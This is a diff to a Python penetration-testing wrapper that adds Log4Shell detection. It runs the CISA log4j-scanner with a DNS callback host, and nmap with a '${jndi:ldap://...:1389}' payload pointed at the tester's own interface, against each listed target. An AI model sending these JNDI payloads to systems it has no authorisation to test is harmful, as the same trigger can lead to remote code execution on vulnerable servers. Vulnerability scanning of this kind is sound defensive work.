@@ -155,6 +155,17 @@ def run_jetleak(service_proto, host_address, service_port, web_root):
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
 
+def run_log4j_scan(service_proto, host_address, service_port, web_root):
+    import netifaces as ni
+    eth0_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+    #print("Don't forget to run this: tcpdump -i eth0 -nn dst %s and dst port 53" eth0_ip)
+    #input("Press Enter to continue...")
+    if not os.path.exists("cisagov-log4j-scanner"): os.system("git clone --quiet https://github.com/cisagov/log4j-scanner cisagov-log4j-scanner")
+    print("\n\n[*] Running log4j-scan.py on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
+    cmd = "python3 cisagov-log4j-scanner/log4-scanner/log4j-scan.py --run-all-tests --headers-file cisagov-log4j-scanner/log4-scanner/headers-large.txt --disable-http-redirects --custom-dns-callback-host %s:1389 -u %s://%s:%s%s | tee %s/pya-log4j-scan-output-%s-%s-%s.txt" % (eth0_ip, service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
+    print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
+    os.system(cmd)
+
 def run_dirb(service_proto, host_address, service_port, web_root):
     print("\n\n[*] Running dirb on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
     cmd = "dirb %s://%s:%s%s /usr/share/dirb/wordlists/common.txt -o %s/pya-dirb-output-%s-%s-%s.txt -w -r" % (service_proto, host_address, service_port, web_root, directory_name, host_address, service_port, service_proto)
@@ -168,6 +179,14 @@ def run_sslyze(service_proto, host_address, service_port, web_root):
     print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
     os.system(cmd)
     os.system("cat %s/pya-sslyze-output-%s-%s.txt" % (directory_name, host_address, service_port))
+
+def run_nmap_log4j(service_proto, host_address, service_port, web_root):
+    import netifaces as ni
+    eth0_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+    print("\n\n[*] Running nmaplog4j on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
+    cmd = "nmap -n -Pn -sTV -p %s --script $PWD/ --script-args log4shell.payload=\"\${jndi:ldap://%s:1389}\" --open -oA %s/pya-nmap-log4j-output-%s-tcp %s" % (service_port, eth0_ip, directory_name, host_address, host_address)
+    print("%s@%s:~$ %s" % (user, get_public_ip(), cmd))
+    os.system(cmd)
 
 def run_nmap_scripts(service_proto, host_address, service_port, web_root):
     print("\n\n[*] Running nmapnse on %s://%s:%s%s" % (service_proto, host_address, service_port, web_root))
@@ -263,6 +282,11 @@ elif option == "jetleak":
     host_address = row.rstrip()
     run_jetleak(service_proto, host_address, service_port, web_root)
 
+elif option == "log4j":
+  for row in targets:
+    host_address = row.rstrip()
+    run_log4j_scan(service_proto, host_address, service_port, web_root)
+
 elif option == "dirb":
   for row in targets:
     host_address = row.rstrip()
@@ -272,6 +296,11 @@ elif option == "sslyze":
   for row in targets:
     host_address = row.rstrip()
     run_sslyze(service_proto, host_address, service_port, web_root)
+
+elif option == "nselog4j":
+  for row in targets:
+    host_address = row.rstrip()
+    run_nmap_log4j(service_proto, host_address, service_port, web_root)
 
 elif option == "nse":
   for row in targets:
